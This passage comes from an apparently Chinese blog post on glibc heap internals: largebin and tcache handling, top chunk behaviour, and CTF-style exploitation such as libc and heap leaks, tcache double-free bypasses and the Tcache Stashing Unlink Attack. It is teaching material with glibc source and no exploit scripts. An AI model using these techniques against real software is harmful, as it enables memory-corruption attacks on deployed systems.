class="token comment">//如果表不为空  </span>                <span class="token punctuation">&#123;</span>                    <span class="token comment">/* Or with inuse bit to speed comparisons */</span>                    size <span class="token operator">|=</span> PREV_INUSE<span class="token punctuation">;</span>                    <span class="token comment">/* if smaller than smallest, bypass loop below */</span>                    <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span>   <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bck->bk是当前最小的chunk，如果size比它还小，那么直接插入到表尾  </span>                    <span class="token punctuation">&#123;</span>                        fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span><span class="token comment">//感觉这个不符合我自己的编码习惯，如果我写我肯定fwd=bck->fd，也好理解一些  </span>                      bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span>                           victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>                        victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                        fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>  <span class="token comment">//总的来说，就是链表的插入操作  </span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">else</span><span class="token comment">//如果不是最小，那就由小到大找到第一个比它小的插在它的前面  </span>                    <span class="token punctuation">&#123;</span>                        <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                          <span class="token punctuation">&#123;</span>                            fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>                <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token punctuation">&#125;</span>                           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size                <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                          <span class="token comment">/* Always insert in the second position.  */</span>                          fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span><span class="token comment">//如果说是已经存在相同大小的chunk，就纵向插入  </span>                      <span class="token keyword">else</span>                          <span class="token punctuation">&#123;</span>                            victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                            victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//这个检查好像和unlink一样，都是检查fwd的指针有没有被恶意修改  </span>                            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                            victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                          <span class="token punctuation">&#125;</span>                        bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span><span class="token comment">//这里的bck是用来纵向插入的  </span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> fwd<span class="token punctuation">)</span>                          <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (bk)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同样是纵向检查指针有没有被恶意修改  </span>                    <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span>                  victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token comment">//如果表为空，那么指针自指  </span>            <span class="token punctuation">&#125;</span>               <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>            victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>            victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>            fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>            bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token comment">//不管到底有没有重复，都进行一次纵向链接，保证一些指针为NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>从代码中可以看出，fastbin 链接是从大到小开始排列。</p><h3 id="如何插入chunk"><a class="header-anchor" href="#如何插入chunk">¶</a>如何插入chunk</h3><ul><li>寻找index，即寻找在哪一条绳子上</li><li>有了index之后，首先判空，如果链表为空则<br><code>victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</code>自己指向自己</li><li>之后判断size，是否比最小的chunk还要小，如果比最小的还要小，那么直接插入到链表的末尾</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>  bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span>  victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>  victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>  fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里完成前两步的赋值之后，fwd就是bin，可以发现就是把victim插入到链表的末尾。</p><ul><li>如果不是最小的，<strong>那么从大到小开始遍历</strong><ul><li>如果找到一样大小的，则使用头插法，插入目标链表</li><li>如果没有一样大小的，在中间插入即可<br>此时，又fwd的内存检测，检测和<code>unlink</code>差不多<br>值得注意的是，最后一段赋值的代码，每一种情况都会执行</li></ul></li></ul><h3 id="取出chunk"><a class="header-anchor" href="#取出chunk">¶</a>取出chunk</h3><p>这里默认能够从largebin中取出。先找到相应的index，在index中从小到大遍历堆块，找到第一个比所需大小大（或等于）的堆块。然后unlink，和其它的bins一样，存在着对fd，bk，fd_nextsize以及bk_nextsize的检测。对取下的chunk如果大小不等于申请的size，那就存在着切割操作。如果剩余大小大于MINSIZE。则返还给unsorted bin，否则一并给用户。</p><h3 id="tcache"><a class="header-anchor" href="#tcache">¶</a>tcache</h3><p>这也是2.26版之后出现的管理机制，从某种程度上来说，管理的安全性能不如fastbin，但是速度确实提升了。</p><ul><li><p><code>tcache_perthread_struct</code>是一个管理Tcache的结构体，这个结构体也作为一个大的chunk，存在于heap的开始位置，libc2.27该chunk的大小为0x250，后面增加到了0x290，<code>tcache bin</code>的信息都由该chunk存储，<strong>劫持</strong>这个chunk可以控制tcache bin的所有情况。</p></li><li><p>从<code>fastbin</code> 和 <code>smallbin</code>中拿出chunk之后，剩下的chunk全部都会滑入tcache</p></li><li><p>在<code>__libc_malloc()</code>调用<code>__int_malloc()</code>之前，如果<code>tcache bin</code>中有符合要求的<code>chunk</code>就直接将其返回。</p></li><li><p><code>calloc()</code>越过<code>tcache</code>取<code>chunk</code>，通过<code>calloc()</code>分配的堆块会<strong>清零</strong>。<strong>补充：</strong><code>realloc()</code>的特殊用法：<code>size == 0</code>时，等同于<code>free</code>；<code>realloc_ptr == 0 &amp;&amp; size &gt; 0</code> 时等同于<code>malloc</code>。如果当前连续内存块足够<code>realloc</code>的话，只是将<code>p</code>所指向的空间扩大，并返回<code>p</code>的指针地址；如果当前连续内存块不够，则再找一个足够大的地方，分配一块新的内存<code>q</code>，并将<code>p</code>指向的内容<code>copy</code>到<code>q</code>，返回 <code>q</code>。并将<code>p</code>所指向的内存空间<code>free</code>；若是通过<code>realloc</code>缩小堆块，则返回的指针<code>p</code>不变，但原先相比缩小后多余的那部分将会被<code>free</code>掉。</p></li></ul><p>在libc版本的迭代中，tcache也有很多的保护机制的更新，后面会在具体的利用中提到</p><h3 id="topchunk"><a class="header-anchor" href="#topchunk">¶</a>topchunk</h3><p>topchunk的利用较少，几乎只有一个<code>house of force</code>，除此之外还有一些小trick</p><blockquote><p>当申请的<code>size</code>不大于<code>mmap</code>的阈值，但<code>top chunk</code>当前的大小又不足以分配，则会扩展<code>top chunk</code>，然后从新<code>top chunk</code>里进行分配。</p></blockquote><p>但是，当申请的size大于topchunk的时候，不一定会直接扩展topchunk的大小，而是free原来的topchunk，然后再malloc一块新的topchunk，这种机制再house of orange中被用到，常用于程序中没有free的机会。</p><p>具体是，如果<code>brk</code>等于该不够大小的<code>top chunk</code>（被记作<code>old_top_chunk</code>）的<code>end</code>位置（<code>old_end</code>，等于<code>old_top + old_size</code>），即<code>top chunk</code>的<code>size</code>并没有被修改，完全是自然地分配堆块，导致了<code>top chunk</code>不够用，则会从<code>old_top</code>处开辟更大的一块空间作为新的<code>top chunk</code>，也就是将原先的<code>old_top_chunk</code>进行扩展了，此时没有<code>free</code>，且<code>top chunk</code>的起始位置也没有改变，但是如果<code>brk</code>不等于<code>old_end</code>，则会先<code>free</code>掉<code>old_top_chunk</code>，再从<code>brk</code>处开辟一片空间作为<code>new_top_chunk</code>，此时的<code>top chunk</code>头部位置变为了原先的<code>brk</code>，而如今的<code>brk</code>也做了相应的扩展，并且<code>unsorted bin</code>或<code>tcache</code>中（一般修改的大小都至少会是<code>small bin</code>范围，但具体在哪得分情况看）会有被<code>free</code>的<code>old_top_chunk</code>。 因此，可以通过改小<code>top chunk</code>的<code>size</code>，再申请大堆块，做到对旧<code>top chunk</code>的<code>free</code>，不过修改的<code>size</code>需要绕过一些检测。 相关源码如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">old_top <span class="token operator">=</span> av<span class="token operator">-></span>top<span class="token punctuation">;</span>  old_size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>old_top<span class="token punctuation">)</span><span class="token punctuation">;</span>  old_end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>old_top<span class="token punctuation">,</span> old_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// old_end = old_top + old_size  </span><span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>old_top <span class="token operator">==</span> <span class="token function">initial_top</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> old_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>old_size<span class="token punctuation">)</span> <span class="token operator">>=</span> MINSIZE <span class="token operator">&amp;&amp;</span>           <span class="token function">prev_inuse</span> <span class="token punctuation">(</span>old_top<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> old_end <span class="token operator">&amp;</span> <span class="token punctuation">(</span>pagesize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>需要绕过以上的断言，主要就是要求被修改的<code>top chunk</code>的<code>size</code>的<code>prev_inuse</code>位要为<code>1</code>并且<code>old_end</code>要内存页对齐，所以就要求被修改的<code>size</code>的后三位和原先要保持一致。</p><h1>Vulnerable &amp; exploit</h1><p>下面是总结一些漏洞出现的情况和利用方式</p><p>目前来看，漏洞出现的模式就只有四种：</p><ol><li><p>溢出，朴实无华的溢出</p></li><li><p>特殊的溢出，即off_by_one</p></li><li><p>UAF，代码编写上的bug</p></li><li><p>堆风水</p></li></ol><p>在漏洞利用上面，先不考虑漏洞的类型，从堆漏洞到rce的过程中，最核心的几个步骤就是能够leak，leak之后能够劫持chunk的分配，即通过漏洞获得任意地址写，修改hook或者IO，获得shell</p><p>把漏洞和利用的目的结合在一起看，似乎更能够看到其中的联系</p><h2 id="leak"><a class="header-anchor" href="#leak">¶</a>leak?</h2><p>泄露的方法有点单调，在早期无非就是unsorted bin，通过UAF或者别的方法，获得unsorted bin中的指针，从而泄露出main_arena的地址，后面则还可以通过IO的劫持来达到目标。</p><p>先说劫持<code>unsorted bin</code>中的指针，其中有一点是，在某个版本之前，unsorted bin中的chunk取出来的时候不会消除其中残留的指针，所以很简单的<code>free malloc</code>就可以获得libc的基址</p><p><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/image-20221122210635583.png" alt="image-20221122210635583"></p><p>这种方法看起来简单，但是实际上运用的比较少，毕竟这么简单的机会，总有些限制条件给pass掉的。一般能够利用的leak方法和劫持都是相通的，在没有直接UAF的条件下，构造出来<code>chunk overlap</code>即一个chunk同时处在unsorted bin和别的位置，这种情况下一般有两个指针，ptr1和ptr2都指向chunk，但是ptr2指向unsorted bin，所以就无法使用，但是可以利用ptr1泄露。</p><p>此外，利用IO进行leak也是比较常见的方法，这种方法多用于没有leak函数的情况，IO的利用这里不多讲，内容比较多，后面单独总结。</p><p>除了libc的基址之外，还有heap的基址，heap的基址leak起来和libc差不多，一般libc的难度比较大，但是不排除前面讲的libc基址直接通过unsorted bin带出来，这种情况下leak heap的地址就要一些特殊的方法。</p><p>观察<code>large bin</code>插入chunk时的源码，可以发现如果插入的位置原来为空，则<code>fd_nextsize</code>和<code>bk_nextsize</code>都指向自己</p><p><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/image-20221122215109112.png" alt=""></p><p>通过这样的特殊条件可以leak出来heap基址。</p><p>此外，在<code>libc2.32</code>以及以后的版本，会对<code>tcache 的 fd</code>指针做一个特殊的异或保护操作，但是在这种机制下，第一个chunk被链入的时候，可以直接leak出堆地址，这个后面可以详细说。</p><p>总结以上的leak方法，分以下几种情况。（都建立在有leak 函数的条件）</p><ol><li><p>如果可以直接 free malloc带出main_arena的地址，可以直接leak</p></li><li><p>如果以上条件不满足，且漏洞条件为UAF，则直接free之后可以leak</p></li><li><p>如果漏洞不为UAF，则需要考虑别的方法，打一个堆重叠chunk进unsorted bin</p></li></ol><h3 id="利用"><a class="header-anchor" href="#利用">¶</a>利用</h3><p>利用的方法就比较多样化了，但是利用的目标还是不变的，任意地址写或者说任意地址堆分配的权力，再往下细一点就是，需要劫持<code>fd</code>指针，然后再进一步控制程序流程。</p><p>这个时候就会考虑到很多的 保护方法，所以这里主要对各大libc版本的保护方法做一个总结</p><p>关注现在比较主流的，libc2.27开始一直到libc2.34，23版本就不多说了，出现较少，攻击方式实际上也比较单一。</p><h4 id="libc2-27"><a class="header-anchor" href="#libc2-27">¶</a>libc2.27</h4><p>实际上在libc2.27分为两个版本，主要是在2.27中做了一次小更新，修复了<code>tcache</code>的无脑<code>double free</code>，因为在最开始的tcache中没有double free检查，所以遇到题目是2.27的，都可以试一下能不能double free。</p><p>其次，tcache是可以任意地址写的，没有fast bin那种限制size的检查，但同时要注意的是<strong>fd指向的并不是堆头，而是堆内容</strong>，即伪造fd的时候，<code>fd</code>应该直接写到<code>target address</code>，在有<code>tcache</code>的<code>libc</code>发行版中，保护最薄弱的就是2.27了，也没什么好总结的，没有特殊的利用方法，就是很朴素的劫持fd指针，然后任意地址写。</p><p>这里提一个有意的利用方法，这个方法在后续的版本中也适用，但是造成的危害不一样。</p><h5 id="Tcache-Stashing-Unlink-Attack"><a class="header-anchor" href="#Tcache-Stashing-Unlink-Attack">¶</a>Tcache Stashing Unlink Attack</h5><p>这种attack利用的是<code>small bin</code>和tcache的关系，在高版本中还有pro版本。看下面的代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 获取 small bin 中倒数第二个 chunk 。  </span>bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>  <span class="token comment">// 检查 bck->fd 是不是 victim，防止伪造  </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      errstr <span class="token operator">=</span> <span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 设置 victim 对应的 inuse 位  </span><span class="token function">set_inuse_bit_at_offset</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来  </span>bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>  bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这是<code>small bin</code>取出最后一个chunk的操作，可以发现，检查了双链的完整性，但是没有检查bck的合法性。在上面的tcache特性中提到了，从<code>small bin</code>中取出一个chunk之后，剩下的所有chunk会滑入对应大小的<code>tcache bin</code>中，下面看tcache中的代码</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE    </span></span>      <span class="token comment">/* While we're here, if we see other chunks of the same size,            stash them in the tcache. */</span>          <span class="token class-name">size_t</span> tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取对应size的tcache索引    </span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span> <span class="token comment">//如果该索引在tcache bin范围    </span>        <span class="token punctuation">&#123;</span>              mchunkptr tc_victim<span class="token punctuation">;</span>                  <span class="token comment">/* While bin not empty and tcache not full, copy chunks over. */</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count  <span class="token comment">//当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里    </span>             <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                  bck <span class="token operator">=</span> tc_victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>                  <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                <span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                  bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span> <span class="token comment">//将当前chunk从small bin里卸下    </span>              bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>                          <span class="token comment">//放入tcache bin里    </span>              <span class="token function">tcache_put</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span>  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里逻辑比较简单，while循环中，不断的通过<code>tcache_put</code>，把chunk从<code>small bin</code>中转移到tcache中，这个过程没有任何的检查，并且，脱链的时候也没有检查链表的完整性，因为在前面的<code>small bin脱链中</code>已经检查了当时的Victim和bck链表的完整。</p><p><strong>那么可以思考</strong>，如果small bin中存在3个chunk，分别为chunk1 chunk2 chunk3，如果我们可以控制chunk2的bk指针，劫持这个bk到target address，然后执行到<code>bck = tc_victim-&gt;bk;</code>的时候，这个bck是<code>target address</code>，后面执行<code>bck-&gt;fd=bin</code>则往<code>target address+0x10</code>中写入了一个<code>main_arena</code>的地址，并且通过<code>tcache_put</code>能够把<code>victim</code>写入<code>tcache bin</code>中，此外还需要一个条件，就是tcache刚好只留下来了一个位置，这是最理想的，因为理论上分析，如果损坏small bin的bk指针，下一次的操作必然会出现错误，所以最好是能够控制住tcache的count，达到漏洞目标之后停止while循环。</p><p>漏洞危害看起来蛮大，但是有个bug，漏洞需要的前提条件是，从small bin中取出来一个chunk，但是在有tcache的条件下，需要tcache为空似乎才可以达到这个条件，但是这样的话如果需要从small bin取出chunk，那么就需要tcache为空，此时又无法控制tcache的数量，所以说如果仅仅是malloc的话，还是存在一定矛盾的，所以这种attack一般使用在calloc的时候。</p><blockquote><p>效果 &amp; 利用条件</p></blockquote><p>造成的结果是任意地址写一个main_arena的地址，和任意地址链接进tcache，利用条件如下</p><ul><li>有tcache</li><li>至少有一次能够越过tcache 从small bin中取出chunk （ calloc ）</li><li>有机会让chunk从<code>unsorted bin</code>中滑入<code>small bin</code></li><li>可以劫持bk指针<br>利用之后的堆空间</li></ul><p><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/image-20221123201213840.png" alt="image-20221123201213840"></p><blockquote><p>利用方法</p></blockquote><ul><li>首先填满tcache</li><li>然后free两个chunk进unsorted bin，（不可以合并）</li><li>然后申请一个大的chunk，把unsorted bin里面的chunk滑入small bin</li><li>UAF劫持倒数第二个chunk的bk，注意这个bk是chunk头，它是要被链入tcache的。而fake_chunk指向的bk可以指向任意位置→vul_addr，该位置被认为是下一个bck，会造成vul_addr+0x10=bin</li></ul><h4 id="libc2-29"><a class="header-anchor" href="#libc2-29">¶</a>libc2.29</h4><p>从libc2.27到2.29最明显的就是添加了<code>tcache key</code>，即改变了tcache的结构体，用于表示<code>chunk</code>是否已经在所属的<code>tcache bin</code>中，对于每个<code>chunk</code>而言，<code>key</code>在其<code>bk</code>指针的位置上。检查代码如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span><span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> tcache<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      tcache_entry <span class="token operator">*</span>tmp<span class="token punctuation">;</span>      <span class="token function">LIBC_PROBE</span><span class="token punctuation">(</span>memory_tcache_double_free<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>tmp <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span> tmp<span class="token punctuation">;</span> tmp <span class="token operator">=</span> tmp<span class="token operator">-></span>next<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> e<span class="token punctuation">)</span>          <span class="token function">malloc_printerr</span><span class="token punctuation">(</span><span class="token string">"free(): double free detected in tcache 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>检查了<code>double free</code>，如果当时e已经有key了，且e和tcache bin的第一个chunk是一样的，则触发double free的检查，这个关键的<code>key</code>，在进行tcache_put的时候会被赋值为<code>tcache_struct</code>的地址，在<code>tcache_get</code>的时候进行清空。</p><p>绕过的方法也比较简单，想办法破坏掉这个key，那么就不会进入if的条件，此时相当于可以直接double free。</p><p>此外添加了一个<code>unlink</code>检查，代码如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token comment">/* consolidate backward */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>      size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//add  </span>        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size while consolidating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//add  </span>    <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" 